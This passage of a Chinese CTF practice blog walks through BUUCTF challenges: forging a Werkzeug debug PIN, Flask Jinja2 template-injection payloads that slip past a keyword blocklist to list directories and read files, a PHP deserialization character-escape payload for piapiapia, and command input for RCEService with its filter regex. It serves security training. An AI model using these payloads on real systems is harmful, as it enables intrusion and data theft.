class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><p>这里直接记录一下脚本吧，然后输入 pin，进入交互式 shell，执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.popen(&quot;cat /this_is_the_flag.txt&quot;).read()</span><br></pre></td></tr></table></figure><p>读取 flag</p><p>因为我 docker 查不到 id，就一直找看看别人有没有这种情况，然后看到了一个佬直接绕过 waf，得到 flag，记录一下 https://sakurahack-y.github.io/2022/02/27/BUU-% E6% A8% A1% E6%9D% BF% E6% B3% A8% E5%85% A5% E4% B8%93% E9% A1% B9% E5%88% B7% E9% A2%98/</p><p>用上面的语句读取 app.py 整理一下得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template_string</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template,request,flash,redirect,url_for</span><br><span class="line"><span class="keyword">from</span> flask_wtf <span class="keyword">import</span> FlaskForm</span><br><span class="line"><span class="keyword">from</span> wtforms <span class="keyword">import</span> StringField, SubmitField</span><br><span class="line"><span class="keyword">from</span> wtforms.validators <span class="keyword">import</span> DataRequired</span><br><span class="line"><span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"> </span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;s_e_c_r_e_t_k_e_y&#x27;</span></span><br><span class="line">bootstrap = Bootstrap(app)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NameForm</span>(<span class="title class_ inherited__">FlaskForm</span>):</span><br><span class="line">    text = StringField(<span class="string">&#x27;BASE64加密&#x27;</span>,validators= [DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">&#x27;提交&#x27;</span>)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NameForm1</span>(<span class="title class_ inherited__">FlaskForm</span>):</span><br><span class="line">    text = StringField(<span class="string">&#x27;BASE64解密&#x27;</span>,validators= [DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">&#x27;提交&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    black_list = [<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;os&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;import&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;chr&quot;</span>,<span class="string">&quot;request&quot;</span>,</span><br><span class="line">                  <span class="string">&quot;subprocess&quot;</span>,<span class="string">&quot;commands&quot;</span>,<span class="string">&quot;socket&quot;</span>,<span class="string">&quot;hex&quot;</span>,<span class="string">&quot;base64&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;?&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> black_list :</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>.lower() :</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hint&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hint</span>():</span><br><span class="line">    txt = <span class="string">&quot;失败乃成功之母！！&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;hint.html&quot;</span>,txt = txt)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>():</span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>) :</span><br><span class="line">        text = request.values.get(<span class="string">&quot;text&quot;</span>)</span><br><span class="line">        text_decode = base64.b64encode(text.encode())</span><br><span class="line">        tmp = <span class="string">&quot;结果  :&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(text_decode.decode()))</span><br><span class="line">        res =  render_template_string(tmp)</span><br><span class="line">        flash(tmp)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;encode&#x27;</span>))</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        text = <span class="string">&quot;&quot;</span></span><br><span class="line">        form = NameForm(text)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,form = form ,method = <span class="string">&quot;加密&quot;</span> ,img = <span class="string">&quot;flask.png&quot;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/decode&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>():</span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>) :</span><br><span class="line">        text = request.values.get(<span class="string">&quot;text&quot;</span>)</span><br><span class="line">        text_decode = base64.b64decode(text.encode())</span><br><span class="line">        tmp = <span class="string">&quot;结果 ： &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(text_decode.decode())</span><br><span class="line">        <span class="keyword">if</span> waf(tmp) :</span><br><span class="line">            flash(<span class="string">&quot;no no no !!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>))</span><br><span class="line">        res =  render_template_string(tmp)</span><br><span class="line">        flash( res )</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>))</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        text = <span class="string">&quot;&quot;</span></span><br><span class="line">        form = NameForm1(text)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,form = form, method = <span class="string">&quot;解密&quot;</span> , img = <span class="string">&quot;flask1.png&quot;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;name&gt;&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">not_found</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;404.html&quot;</span>,name = name)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>查看 waf</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    black_list = [<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;os&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;import&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;chr&quot;</span>,<span class="string">&quot;request&quot;</span>,</span><br><span class="line">                  <span class="string">&quot;subprocess&quot;</span>,<span class="string">&quot;commands&quot;</span>,<span class="string">&quot;socket&quot;</span>,<span class="string">&quot;hex&quot;</span>,<span class="string">&quot;base64&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;?&quot;</span>]</span><br></pre></td></tr></table></figure><p>利用 python 字符之间用 <code>+</code>  拼接绕过 waf</p><p>查看目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](&#x27;o&#x27;+&#x27;s&#x27;).listdir(&#x27;/&#x27;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e6.png" class="lazyload" data-srcset="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e6.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>看到疑似存 flag 的文件 this_is_the_flag.txt，读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/this_is_the_f&#x27;+&#x27;lag.txt&#x27;, &#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e7.png" class="lazyload" data-srcset="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e7.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p c2dc6edd-17b4-4a66-b3b6-8f5767e19304>得到 flag</p><p>参考文章：<a href="https://blog.csdn.net/SopRomeo/article/details/105875248">https://blog.csdn.net/SopRomeo/article/details/105875248</a></p><p>​<a href="https://blog.csdn.net/rfrder/article/details/110240245">https://blog.csdn.net/rfrder/article/details/110240245</a></p><p>​<a href="https://mayi077.gitee.io/2020/04/17/GYCTF2020-FlaskApp/">https://mayi077.gitee.io/2020/04/17/GYCTF2020-FlaskApp/</a></p><h2 id="0ctf-2016piapiapia"><a class="markdownIt-Anchor" href="#0ctf-2016piapiapia">#</a> [0CTF 2016]piapiapia</h2><p>多次尝试登录，能得到的只有 Invalid password 或者 Invalid user name or password</p><p>扫一下看看</p><p><img src="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e8.png" class="lazyload" data-srcset="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e8.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>扫出来了几个， <code>/register.php</code>  注册完之后可以登录</p><p><img src="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e9.png" class="lazyload" data-srcset="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e9.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>那 update 和 profile 的作用应该都差不多知道了，这个有个浏览选择文件，难道是文件上传漏洞吗？</p><p>有个 zip 先下载看看，防止等下文件上传半天无用功</p><p>代码审计，config 中看到了 flag 字眼</p><p><img src="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e20.png" class="lazyload" data-srcset="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e20.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>在审计 profile 和 update 的时候看到了几个熟悉的函数</p><p>profile 中的 <code>unserialize</code>  和 <code>file_get_contents</code></p><p><img src="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e10.png" class="lazyload" data-srcset="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e10.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>update 中的 <code>unserialize</code></p><p><img src="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e11.png" class="lazyload" data-srcset="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e11.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>查看 profile 中 file_get_contents 函数中的参数 photo，底下的 html 中有一个 echo 参数 photo，猜测本题的突破口就在这个参数中</p><p><img src="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e12.png" class="lazyload" data-srcset="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e12.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>倒推会去，看看 photo 参数怎么得到的</p><p>photo 内容存在 profile 数组键值为 photo 中，profile 有从 user 的 show_profile 传过来，而且和 username 这个参数相关</p><p><img src="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e13.png" class="lazyload" data-srcset="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e13.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>继续往上看，跟到 class.php 中，在 user 类中找到 show_profile 函数</p><p><img src="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e14.png" class="lazyload" data-srcset="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e14.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>这里调用了父类 mysql 类的 filter 函数以及 select，先看看 filter</p><p><img src="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e15.png" class="lazyload" data-srcset="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e15.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</span><br><span class="line"></span><br><span class="line">preg_replace (正则表达式, 替换成什么东西, 目标字符串)</span><br></pre></td></tr></table></figure><p>先将 escape 数组内的单引号和两个 <code>\\</code>  用 <code>|</code>  和两个 <code>/</code>  连接起来，得到一个正则表达式，匹配的是单引号和双斜杠 <code>\\</code> ，将这两个全部换成下划线 <code>_</code></p><p>同理 safe 参数中也是构造一个正则表达式， <code>/select|insert|update|delete|where/i</code>  不区分大小写地匹配这些关键字，将这些替换成 hacker 返回</p><p>再看看 select 函数</p><p><img src="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e16.png" class="lazyload" data-srcset="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e16.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>常见的 sql 查询语句，在查询之前，如果我们注册了新的用户，需要更新一下表单，找一下插入新数据的函数</p><p><img src="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e17.png" class="lazyload" data-srcset="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e17.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>然后再去找找哪里调用了这个函数</p><p><img src="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e18.png" class="lazyload" data-srcset="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e18.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>username 和 new_profile 两个参数都经过了 filter 的过滤才插入表中，接着找找 update_profile 在哪里调用了</p><p>在 update.php 中可以找到</p><p><img src="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e19.png" class="lazyload" data-srcset="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e19.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>通过 post 方法得到信息之后序列化在传入，同时看到 photo 传入之后会被 md5 编码了</p><p>倒推完成之后就可以理清楚调用链条了</p><p>update.php profile 的 POST 传参 -&gt;class.php update_profile ()-&gt;update ()-&gt; 数据库中的表单 -&gt;select ()-&gt;show_profile ()-&gt;profile.php file_get_contents ()</p><p>回到 file_get_contents 函数中说的那个 photo 参数，在审计 update 的时候发现传入的 photo 文件会被 md5 编码了，所以不得不换一个参数了，nickname 参数，可能是因为 nickname 的字符匹配相对没有那么严格吧，在 update.php</p><p><img src="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e21.png" class="lazyload" data-srcset="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e21.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>这一题用到了之前刷题学过的反序列化字符逃逸，重新复习一下在 buuctf 刷题 4 中的 [安洵杯 2019] easy_serialize_php</p><p>回到这一题，这题也是用到了字符逃逸，我们的目标是读取 config.php 函数，上面写到了 config.php 函数里有 flag 字样，尝试读取</p><p>在构建反序列化的同时 profile 文件里面有反序列化的顺序 nickname 参数后面还有 photo 参数，这是读取文件的地方</p><p>但是如何才能让 nickname 参数的反序列化后传给 photo 我们想要的内容呢，在上面的正则表达式中 where 会被替换成 hacker，从 5 位变成 6 位，如果我们有一定数的 where，再替换成 hacker 之后，序列化 <code>s:字符数量:&quot;字符&quot;</code> ，字符数量这个数字不变，实际上双引号内的字符从 5 变成 6，如果我们用定量的 where，就能把 nickname 的反序列化的内容顶出去，成为 photo 的内容</p><p>用具体的数字来说，假如我传入 20 个 where，以及长度为 20 的攻击命令，字符数量填 120，where 占 100，但是在经过替换成 hacker 之后，where 就变成了 120 个字符，还有 20 的攻击命令，我们填的是 120，但是现在实际上有 140 个字符，反序列化之后 nickname 根据我们写的字符数量只取前 120 个，剩下的 20 个就可以是我们的攻击指令</p><p>尝试构造，我们想要让攻击命令传到 photo 参数中，是需要伪造一个 photo 参数的序列化即 <code>s:5:&quot;photo&quot;;</code> ，同时需要加上读取 config.php 的序列化 <code>s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code></p><p>这时候不能忘记有个对 nickname 长度检测的函数，所以 nickname 需要传入 nickname [] 以数组形式绕过检测，而数组的序列化和字符的序列化有所不同，这里我就不复现了直接借一下图</p><p><img src="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e22.png" class="lazyload" data-srcset="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e22.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>可以清晰的看到数组还多了一个 {} 的闭合，所以在 where 的最后还需要加上一个} 来闭合</p><p>先构造出除去 where 的 payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>最前面的双引号是用来闭合 where 字符的，大括号用来闭合数组的，这些字符总共有 34 个，所以我们需要 34 个 where 来把这些攻击命令挤出去，为什么 <code>;&#125;</code>  也要挤出去呢，因为这些闭合的符号是不计在 <code>s:数量:字符</code> 数量中的</p><p>ok 添加 34 个 where 得到最终的 payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>通过 register 界面注册一个账号，update 完成字符逃逸获取 flag，用 bp 抓包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;nickname[]&quot;</span><br><span class="line"></span><br><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e23.png" class="lazyload" data-srcset="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e23.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>放包查看 profile</p><p><img src="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e24.png" class="lazyload" data-srcset="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e24.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>base64 解码</p><p><img src="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e25.png" class="lazyload" data-srcset="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/e25.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>拿到 flag， <code>$flag = 'flag&#123;fd06d0b1-5eb2-45f1-b3a0-2bacf858424a&#125;';</code></p><p>参考：<a href="https://blog.csdn.net/qq_43622442/article/details/105751356">https://blog.csdn.net/qq_43622442/article/details/105751356</a></p><p>这审计太花眼了，一个个函数的推导感觉要做很多才会有很清晰的思路，还需要学习</p><h2 id="fbctf2019rceservice"><a class="markdownIt-Anchor" href="#fbctf2019rceservice">#</a> [FBCTF2019]RCEService</h2><p>本题要用 JSON 格式，先试一下查看目录试试看吧</p><p><code>&#123;&quot;cmd&quot;:&quot;ls&quot;&#125;</code></p><p><img src="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/b1.png" class="lazyload" data-srcset="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/b1.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>读取一下 index.php 看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;cmd&quot;:&quot;cat index.php&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/b2.png" class="lazyload" data-srcset="/2024/04/17/buuctf%E5%88%B7%E9%A2%985/b2.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>被过滤了吗，试了试别的常用指令，都是这样，可能存在过滤吧，看了看师傅们的 wp，哪来的源码啊</p><p>没办法，只能拿过来先学了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$json</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">is_string</span>(<span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$cmd</span> !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> 